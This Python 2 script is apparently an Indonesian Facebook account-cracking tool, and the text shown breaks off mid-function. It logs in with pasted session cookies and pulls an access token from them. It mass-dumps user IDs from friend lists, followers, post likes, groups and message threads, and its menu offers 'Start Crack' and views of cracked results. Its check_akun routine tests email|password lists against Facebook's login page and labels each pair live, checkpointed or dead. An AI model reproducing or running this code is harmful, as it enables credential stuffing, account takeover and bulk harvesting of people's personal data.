#!/usr/bin/python2
#-*-coding:utf-8-*-

# CONDING BY ROZAK GTG
# AUTHOR BY MR.RISKY
# 6283143565470


import requests,bs4,sys,os,subprocess,datetime
import requests,sys,random,time,re,base64,json
from multiprocessing.pool import ThreadPool
reload(sys)
sys.setdefaultencoding("utf-8")
web = datetime.datetime.now()
waktu = web.strftime("%H:%M:%S / %d-%m-%Y ")
try:
    import requests
except ImportError:
    exit(' pip2 install requests *not installed')
try:
    import bs4
except ImportError:
    exit(' pip2 install bs4 *not installed')



q="\033[00m"
h2="\033[40m"
b2="\033[44m"
c2="\033[46m"
i2="\033[42m"
u2="\033[45m"
m2="\033[41m"
p2="\033[47m"
k2="\033[43m"
b='\033[1;94m'
i='\033[0;92m'
c='\033[0;96m'
m='\033[0;91m'
u='\033[0;95m'
k='\033[0;93m'
p='\033[0;97m'
h='\033[0;90m'
p = "\x1b[1;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\033[0;36m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\033[0;32m" # biru muda
P = "\x1b[0;33m" # putih
M = "\x1b[0;31m" # merah
I = "\x1b[0;32m" # hijau
K = "\033[0;33m" # kuning
B = "\x1b[0;34m" # biru
U = "\x1b[0;35m" # ungu
C = "\033[0;32m" # biru muda
warna = random.choice([p, m, h, k, b, u, o, P, M, I, K, B, U, C])


war = (c+"["+p+"!"+c+"] "+p) # [!]
inp = (c+"["+p+"?"+c+"] "+p) # [?]
blt = (c+"["+p+"+"+c+"] "+p) # [+]
oke = (c+"["+p+"✓"+c+"]"+p) # [✓]

satu = (c+"["+p+"1"+c+"]"+p) # [1]
dua = (c+"["+p+"2"+c+"]"+p) # [2]
tiga = (c+"["+p+"3"+c+"]"+p) # [3]
empat = (c+"["+p+"4"+c+"]"+p) # [4]
lima = (c+"["+p+"5"+c+"]"+p) # [5]
enam = (c+"["+p+"6"+c+"]"+p) # [6]
tujuh = (c+"["+p+"7"+c+"]"+p) # [7]
delapan = (c+"["+p+"8"+c+"]"+p) # [8]
sembilan = (c+"["+p+"9"+c+"]"+p) # [9]
nol = (c+"["+p+"9"+c+"]"+p) # [0]

# Jangan DiEdit !!
"""
kga = random.choice([])
month, day, year = tll.split("/")
hi = day+'/'+month+'/'+year
"""

logo = ("""%s
[%s+%s]%s——————————————————————————————————————————————————————————————————————%s[%s+%s]%s
   __  __  ____   _____ __     __ ___
  |  \/  || __ ) |  ___|\ \   / /|___ \  %s-Athour   : %sRozhak, Mr.Risky%s
  | |\/| ||  _ \ | |_    \ \ / /   __) | %s-WhatsApp : %s+6283143565470%s
  | |  | || |_) ||  _|    \ V /   / __/  %s-Facebook : %sFb.com/llovexnxx%s
  |_|  |_||____/ |_|       \_/   |_____| %s-Github   : %sGithub.com/Dumai-991%s
			    %s%s
%s[%s+%s]%s——————————————————————————————————————————————————————————————————————%s[%s+%s]%s

"""%(c,p,c,p,c,p,c,i,k,p,i,c,p,i,c,p,i,c,p,i,warna,waktu,c,p,c,p,c,p,c,q))
hostm="https://m.facebook.com"
uac = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' # Useragent Buat Dump
ua = 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF'
ip=requests.get("https://api.ipify.org").text.strip()
lok=requests.get("https://ipapi.com/ip_api.php?ip="+ip,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
url = 'https://mobile.facebook.com/login.php'
headersc = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF','Accept-Language' : 'en-US,en;q=0.5'}
mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mbasic_h2={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
free_h={"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
mfb_h={'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent':ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
graph_h={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
# Boleh Di Tambahin Jangan Di Ganti #
def cek_login():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print (war+'Cookies Invalid')
		login()
	print (oke+'Login Berhasil')
	menu()
def cek_cookies():
	menu()
	dell = ("""
	cvds=None
        new=None
        if cek(1)==False:
                try:
                        cookie=cvd(open("coki.log").read().strip())
                        cvds=cvd(cookie)
                        new=True
                except:
                        print(war+"Cookies Invalid");login()
        else:
                cvds=cvd(open("coki.log").read().strip())
        r=requests.get("https://mbasic.facebook.com/profile.php",
                cookies=cvds,
        headers=hdcok()).text
        if len(bs4.re.findall("logout",r)) !=0:
		print(war+'Sedang Check Cookies !!')
		time.sleep(2)
                print(war+"Selamat Datang : %s"%(
                        bs4.BeautifulSoup(r,
                "html.parser").find("title").text[0:10]))
		time.sleep(3)
		menu()
	else:
                try:
                        os.remove("coki.log")
                except:
                        pass
                print(war+"Cookies Invalid");login()
	""")
def login():
    os.system('clear')
    print logo
    print(c+'['+p+'1'+c+']'+p+' Login Menggunakan Cookies')
    print(c+'['+p+'2'+c+']'+p+' Cara Mendapatkan Cookies')
    print(c+'['+p+'0'+c+']'+p+' Keluar')
    lg = raw_input('\n'+inp+'Input : ')
    if lg == '':
        os.sys.exit()
    elif lg == '1' or lg == '01':
        try:
		cookie = raw_input(inp+"Cookies : ")
                data = {
                            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
                                'referer' : 'https://m.facebook.com/',
                                'host' : 'm.facebook.com',
                                'origin' : 'https://m.facebook.com',
                                'upgrade-insecure-requests' : '1',
                                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                                'cache-control' : 'max-age=0',
                                'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'content-type' : 'text/html; charset=utf-8',
                                 'cookie' : cookie }
                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
                cari = re.search('(EAAA\w+)', coki.text)
                hasil = cari.group(1)
                pup = open('coki.log', 'w')
                pup.write(cookie)
                pup.close()
                pip = open('login.txt', 'w')
                pip.write(hasil)
                pip.close()
                cek_login()
        except AttributeError:
                print war+'Cookies Salah'
                time.sleep(3)
                login()
        except UnboundLocalError:
                print war+'Cookies Salah'
                time.sleep(3)
                login()
        except requests.exceptions.SSLError:
                print war+'Tidak Ada Koneksi'
                exit()
    elif lg == '2' or lg == '02':
	jalan (' *Anda Akan Diarahkan Ke Browser')
	time.sleep(2)
	os.system("xdg-open https://youtu.be/3Y6xsMB3wRg")
	time.sleep(3)
	exit()
    elif lg == '0' or lg == '00':
        os.sys.exit()
    else:
        exit(war+'Isi Dengan Benar')
def basecookie():
	if os.path.exists("coki.log"):
		if os.path.getsize("coki.log") !=0:
			return gets_dict_cookies(open('coki.log').read().strip())
		else:login()
	else:login()
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def hdcok():
	global hostm,uac
	hosts=hostm
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": uac, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
def menu():
  global ip
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nm = a['name']
    id = a['id']
  except KeyError,IOError:
    print (war+"Cookies Invalid")
    os.system('rm -rf login.txt')
    time.sleep(1)
    login()
  except requests.exceptions.ConnectionError:
    print (war+"Tidak Ada Koneksi")
    exit()
  except Exception as e:
    print (war+'Cookies Invalid')
    time.sleep(1)
    login()
  os.system("clear")
  print logo
  print (blt+'Nama : '+i+nm)
  print (blt+'Your ID : '+i+id)
  print (blt+'Ip Address : '+i+ip)
  print (war+'Your Status : '+k+"Test")

  print ('\n'+c+'['+p+'1'+c+']'+p+'Dump ID Dari Cari Nama')
  print (c+'['+p+'2'+c+']'+p+'Dump ID Dari Teman')
  print (c+'['+p+'3'+c+']'+p+'Dump ID Dari Publik')
  print (c+'['+p+'4'+c+']'+p+'Dump ID Dari Follower')
  print (c+'['+p+'8'+c+']'+p+'Start Crack/Mulai Crack')
  print (c+'['+p+'9'+c+']'+p+'Lihat Hasil Crack')
  print (c+'['+p+'A'+c+']'+p+'Buat Key Elit')
  print (c+'['+p+'B'+c+']'+p+'Menu User Elit')
  print (c+'['+p+'0'+c+']'+p+'Hapus Cookies\n')
  mn = raw_input(inp+"Input : "+i)
  if mn == "":
	print (war+'Isi Dengan Benar')
	menu()
  elif mn == "1" or mn == '01':
    dumpfl()
    exit()
  elif mn == "2" or mn == '02':
    teman()
  elif mn =="3" or mn == '03':
    dfs = raw_input('\n'+inp+'Dump Fast/Slow (f/s) : ')
    if dfs == '':
        menu()
    elif dfs == 'F' or dfs == 'f':
        publik()
    elif dfs == 'S' or dfs == 's':
        friendlist(basecookie())
    else:
	print (war+'Isi Dengan Benar')
	menu()
  elif mn == "4" or mn == '04':
    follow()
  elif mn == "5" or mn == '05':
    like()
  elif mn == "6" or mn == '06':
    dump_grup(basecookie())
  elif mn == "7" or mn == '07':
    dump_message(basecookie())
  elif mn =="8" or mn == '08':
    metode()
  elif mn == "9" or mn == "09":
    print ('\n'+satu+'Lihat Hasil Ok')
    print (dua+'Lihat Hasil Cp')
    print (nol+'Kembali\n')
    hs = raw_input(inp+'Input : ')
    if hs == '':
        menu()
    elif hs == '1' or hs == '01':
	ok()
    elif hs == '2' or hs == '02':
	cp()
    elif hs == '0' or hs == '00':
	menu()
    else:
	print (war+'Isi Dengan Benar')
	menu()
  elif mn =="A" or mn == 'a':
    buatkey()
  elif mn =="B" or mn == 'b':
    menu_elit()
  elif mn == "0" or mn == '00':
    try:
      os.remove("login.txt")
      os.remove("coki.log")
      print (blt+'Berhasil Menghapus Cookies')
      os.sys.exit()
    except Exception as e:
	print (war+'File Tidak Ada')
	os.sys.exit()
  else:
    print (war+'Isi Dengan Benar')
    menu()
#### MENU ELIT ####
def buatkey():
	expi = raw_input(inp+"Masukan Tanggal Expired : "+I)
	if expi in [""," "]:
		print(war+"Isi Dengan Benar !!")
		buatkey()
	eexpi = raw_input(inp+"Masukan Bulan Expired : "+I)
	if eexpi in [""," "]:
		print(war+"Isi Dengan Benar !!")
		buatkey()
	eeexpi = raw_input(inp+"Masukan Tahun Expired : "+I)
	if eeexpi in [""," "]:
		print(war+"Isi Dengan Benar !!")
		buatkey()
	def random_char(kg):
		import random,string
		return ''.join(random.choice(string.ascii_letters) for x in range(kg))
	print (war+random_char(40)+u+"•"+c+expi+i+"/"+c+eexpi+i+"/"+c+eeexpi)
	print (war+random_char(40)+u+"•"+c+expi+i+"/"+c+eexpi+i+"/"+c+eeexpi)
	print (war+random_char(40)+u+"•"+c+expi+i+"/"+c+eexpi+i+"/"+c+eeexpi)
	exit()
def ceklin():
#    rr = requests.get('https://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/License_2021').text.strip() # Jangan Di ganti bro'i nanti error
    try:
        ll = open('license.txt', 'r').read()
        while len(ll) < 35:
                jalan(war+"License Can't Be Empty !!" if l in (""," ") else (war+"Key/License Must Be More Than 35 Words"))
                time.sleep(3)
                os.system("rm -rf license.txt")
                exit()
        rr = requests.get('https://pastebin.com/raw/bxZrCxAZ').text.strip() # Jangan Di ganti bro'i nanti error
        if ll == rr:
		print(war+"Selamat Anda User Elit")
                ll = open('license.txt', 'r').read()
		hau = """
                titid  = rr.split(l+"•")
                lonja = ("%s"%({titid[1]}))
                peler  = lonja.split("<")
                kolorlo = ("%s"%({peler[0]}))
                tgl, bln, thn = kolorlo.split("/")
                print(war+'Tanggal Now     : '+I+waktu)
                print(war+'Tanggal Expired : '+I+tgl+"-"+bln+"-"+thn)
                allttl = (thn+bln+tgl)
                time.sleep(0.75)
                if waktu >= allttl:
                        os.system("rm -rf license.txt")
                        print("\n"+war+"Maaf License Anda Sudah Habis !!")
			print(war+"Silahkan Hubungi Athour Untuk Memperpanjang Hidup Mu... :v")
                        exit()
"""
                pass
        else:
                exit(war+"Maaf Kamu Bukan User Elit :v")
    except Exception as e:
        exit(war+'Error : %s'%(e))
    except requests.exceptions.ConnectionError:
        os.system('clear')
        print (war+'Maaf Jaringan Anda Hilang ;p')
        os.sys.exit()
    except KeyboardInterrupt:
        os.sys.exit()
    except (KeyError,IOError):
        time.sleep(1)
        os.sys.exit()
def menu_elit():
	try:
		ceklinx = requests.get("https://github.com/TEAM-TERMUX-INDONESIA/DATA-FILE/blob/main/License_2021").text.strip()
	except requests.exceptions.ConnectionError:
		os.system('clear')
		print (war+'Maaf Jaringan Anda Erorr !!')
		os.sys.exit()
	print(war+"Sedang Check Data-Data Anda !!")
	ceklin()
	print(satu+"Check Sensi/Opsi Akun Facebook")
	print(dua+'Check Teman Dan Follow Facebook')
	print(tiga+'Coming Soon')
	print(empat+'Coming Soon')
	print(lima+'Coming Soon')
	exit()


#### MENU ELIT ENC ####
def check_akun():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print(war+'Cookies Invalid')
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	live = []
	cek = []
	die = []
	try:
		file = raw_input('\n'+inp+'File Name : ')
		list = open(file,'r').readlines()
	except IOError:
		print (war+"File Tidak Ada")
		raw_input(' {Kembali}')
		menu()
	pmsh = raw_input(inp+'Pemisah : ')
	print(inp+'Check Akun Sedang Berlangsung...\n')
	for yes in list:
		email, pw = (yes.strip()).split(str(pmsh))
		data = {'email': email,'pass': pw}
		xox = requests.post(url, headers=headersc, data=data).text
		if "xc_message" in xox:
			live.append(pw)
			print('\033[0;92m [Live] '+email+'|'+pw)
		elif "checkpointSubmitButton-actual-button" in xox:
			cek.append(pw)
			print('\033[0;93m [Check] '+email+'|'+pw)
		elif "login_error" in xox:
			die.append(pw)
			print('\033[0;91m [Die] '+email+'|'+pw)
		else:
			die.append(pw)
			print('\033[0;91m [Die] '+email+'|'+pw)
	print('\n\x1b[37m [Done] *Live : '+str(len(live))+' - *Check : '+str(len(cek))+' - *Die : '+str(len(die)))
	exit()
	menu()
def ok():
	try:
		ok=open('Ok.txt','r').read()
		print ok
	except KeyError,IOError:
                print (war+'Hasil Ok Tidak Ada')
		os.sys.exit()
	except Exception as e:
	        print (war+'Hasil Ok Tidak Ada')
	        os.sys.exit()
def cp():
        try:
                cp=open('Cp.txt','r').read()
                print cp
        except KeyError,IOError:
                print (war+'Hasil Cp Tidak Ada')
                os.sys.exit()
	except Exception as e:
        	print (war+'Hasil Cp Tidak Ada')
	        os.sys.exit()
def teman():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (war+'Cookies Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
		limit = '5000'
                file = raw_input("\n"+inp+"Nama File : ")
                try:
                   r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit="+limit)
                except KeyError:
			print (war+'Tidak Ada Teman')
			raw_input(" {Kembali}")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('tmn.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r"+war+"Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print("\n\n"+war+"Selesai")
		print(war+"File Tersimpan : "+file)
		raw_input(" {Kembali}")
		menu()

        except requests.exceptions.ConnectionError:
		print (war+'Tidak Ada Koneksi')
		os.sys.exit()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print (war+'Cookies Invalid')
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		idt = raw_input(blt+"Profil ID : ")
		limit = '5000'
		file = raw_input(inp+"Nama File : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(blt+"Nama : "+op["name"])
		except KeyError:
			print(war+'Profil ID Tidak Ada')
			raw_input(" {Kembali}")
			menu
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ('pbk.txt').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r"+war+"Dump %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.close()
		os.rename(qq,file)
		print("\n\n"+war+"Selesai")
                print(blt+"File Dump Tersimpan : "+file)
                raw_input(" {Kembali}")
                menu()

	except Exception as e:
		print(war+'Tidak Ada Teman')
		menu()
	except KeyError:
                print(war+'Tidak Ada Teman')
                raw_input(' {Kembali}')
                menu()
def follow():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print (war+'Cookies Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
                idt = raw_input("\n"+war+"Profil ID : ")
                limit = '5000'
                file = raw_input(blt+"Nama File : ")
                try:
                        jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
                        op = json.loads(jok.text)
                        print(blt+"Nama : "+op["name"])
                except KeyError:
			print (war+'ID Tidak Ditemukan')
			raw_input(" {Kembali}")
			menu()
                r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit="+limit)
                id = []
                z=json.loads(r.text)
                qq = ('flw.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r"+war+"Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print("\n\n"+war+"Selesai")
		print(war+"File Dump Tersimpan : "+file)
		raw_input(" {Kembali}")
                menu()

        except KeyError:
		print(war+'Tidak Ada Followers')
                raw_input(' {Kembali}')
                menu()
        except requests.exceptions.ConnectionError:
		print(war+'Tidak Ada Koneksi')
		os.sys.exit()
def like():
        try:
                toket=open('login.txt','r').read()
        except IOError:
		print(war+'Cookies Invalid')
                os.system('rm -rf login.txt')
                time.sleep(0.01)
                login()
        try:
                idt = raw_input("\n"+inp+"Post ID : ")
		limit = '5000'
                file = raw_input(inp+"Nama File : ")
                try:
                   r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit="+limit+"&access_token="+toket)
                except KeyError:
			print (war+'Post ID Tidak Ada')
			raw_input(" {Kembali}")
                        menu()
                id = []
                z=json.loads(r.text)
                qq = ('lke.txt').replace(" ","_")
                ys = open(qq , 'w')#.replace(" ","_")
                for a in z['data']:
                        id.append(a['id']+"<=>"+a['name'])
                        ys.write(a['id']+"<=>"+a['name']+'\n')
                        print("\r"+war+"Dump %s ID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                ys.close()
                os.rename(qq,file)
		print("\n\n"+war+"Selesai")
		print(war+"File Dump Tersimpan : "+file)
		raw_input(" {Kembali}")
		menu()

        except KeyError:
		print (war+'Harus Berupa ID Postingan')
                raw_input(' {Kembali}')
                menu()
        except requests.exceptions.ConnectionError:
		print (war+'Tidak Ada Koneksi')
		os.sys.exit()
class friendlist:

    def __init__(self, cookie):
        self.nitel = None
        self.cookie = cookie
	user = raw_input(inp+"Username : ")
        self.id = "https://www.facebook.com/"+user
        if self.id == '':
            friendlist(cookie)
        else:
            self.fl = raw_input(inp+"Nama File : ")
            open(self.fl, 'a+')
            id = ('').join(bs4.re.findall('://(.*?)/', self.id))
            if len(id) == 0:
                friendlist(cookie)
            self.ok = bs4.re.sub(id, 'm.facebook.com', self.id).replace('profile.php?id=', '') + '?v=friends'
            self.dump(self.ok)
        return

    def dump(self, ok):
        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), cookies=self.cookie).text, 'html.parser')
        if self.nitel == None:
            a = r.find('title').text[0:20]
            self.nitel = a
            b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
            self.b = b
            print inp+'Nama : %s' % a
        for i in r.find_all('a', href=True):
            if 'fref' in i.get('href'):
                print "\r"+war+"Dump %s/%s ID *type ctrl+z to stop" % (len(open(self.fl).read().splitlines()), self.b),;sys.stdout.flush();time.sleep(0.007)
                if 'profile_add_friend.php' in i.get('href'):
                    continue
                elif 'profile.php' in i.get('href'):
                    ag = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
                else:
                    ag = ('').join(bs4.re.findall('/(.*?)\\?', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
            if 'lihat teman lain' in i.text.lower():
                __import__('time').sleep(2)
                while True:
                    try:
                        self.dump('https://m.facebook.com/' + i.get('href'))
                        __import__('time').sleep(3)
                        break
                    except Exception as e:
                        print '\n'+war+'Dump Gagal %s' % e
                        continue
	print ('\n\n'+blt+'Selesai')
	print (war+'File Dump Tersimpan : '+self.fl)
	raw_input(" {Kembali}")
	menu()
        return
class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 
                       'name': i.text})

        if len(self.glist) != 0:
            print '\n'+blt+'Anda Memiliki %s Grub' % len(self.glist)
            print satu+'Dapatkan Grub Dari Cari Nama'
            print dua+'Masukan ID Grub/Manual'
            while True:
                c = raw_input(inp+'Input : ')
                if c == '':
                    continue
                elif c == '1':
                    self.search()
                    exit()
                elif c == '2':
                    self.manual()
                    exit()
                else:
                    print war+'Isi Dengan Benar'

        else:
            exit(war+'Grub Tidak Ditemukan')

    def manual(self):
        id = raw_input(inp+'Grub ID : ')
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit(war+'Grub ID Tidak Valid/Anda Belum Bergabung Grub')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print war+'Nama Grub : %s' % self.listed.get('name')[0:20]
                self.dumps('https://m.facebook.com/groups/' + id)

    def search(self):
        whitelist = []
        q = raw_input(inp+'Input Grub Name : ').lower()
        if q == '':
            self.search()
        else:
            for e, i in enumerate(self.glist):
                if q in i.get('name').lower():
                    whitelist.append(i)
                    print '  [%s] %s' % (
                     len(whitelist),
                     i.get('name').lower().replace(q, '%s' % (q)))

            if len(whitelist) == 0:
                print inp+'Tidak Ada Hasil Untuk Grub : %s' % q
                self.search()
            else:
                print ''
                self.choice(whitelist)

    def choice(self, whitelist):
        try:
            self.listed = whitelist[(input(inp+'Pilih Grub : ') - 1)]
            self.f()
            print war+'Nama : %s' % self.listed.get('name')
            self.dumps('https://m.facebook.com/groups/' + self.listed.get('id'))
        except Exception as e:
            print war+'%s' % e
            self.choice(whitelist)

    def f(self):
        self.fl = raw_input(inp+"Nama File : ")
        if self.fl == '':
            self.fl()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print "\r"+war+"Dump %s ID *type ctrl+z to stop\r" % len(open(self.fl).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print '\r'+war+'%s, Mencoba Lagi' % e
                        continue

	print ('\n\n'+war+'Selesai')
	print (blt+'File Dump Tersimpan : '+self.fl)
	raw_input(" {Kembali}")
	menu()
class dump_message:

    def __init__(self, cookies):
        self.cookies = cookies
        self.f = raw_input(inp+"Nama File : ")
        if self.f == '':
            dump_message(cookies)
        open(self.f, 'w').close()
        self.dump('https://m.facebook.com/messages')

    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                            print "\r"+war+"Dump %s ID *type ctrl+z to stop" % len(open(self.f).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)

                except Exception as e:
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://m.facebook.com/' + i.get('href'))

	print ('\n\n'+war+'Selesai')
	print (war+'File Dump Tersimpan : '+self.f)
	raw_input(" {Kembali}")
	menu()
def search(fl,r,b):
	open(fl,"a+")
	b=bs4.BeautifulSoup(requests.get(
		b, cookies=r,headers=hdcok()).text,"html.parser")
	for i in b.find_all("a",href=True):
		print "\r"+war+"Dump %s ID"%(len(open(fl).read().splitlines())),;sys.stdout.flush()
		if "<img alt=" in str(i):
			if "home.php" in str(i["href"]):
				continue
			else:
				g=str(i["href"])
				if "profile.php" in g:
					name=i.find("img").get("alt").replace(", profile picture","")
					d=bs4.re.findall("/profile\.php\?id=(.*?)&",g)
					if len (d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
						else:
							open(
								fl,"a+").write("%s<=>%s\n"%(pk,name))
				else:
					d=bs4.re.findall("/(.*?)\?",g)
					name=i.find("img").get("alt").replace(", profile picture","")
					if len(d) !=0:
						pk="".join(d)
						if pk in open(fl).read():
							pass
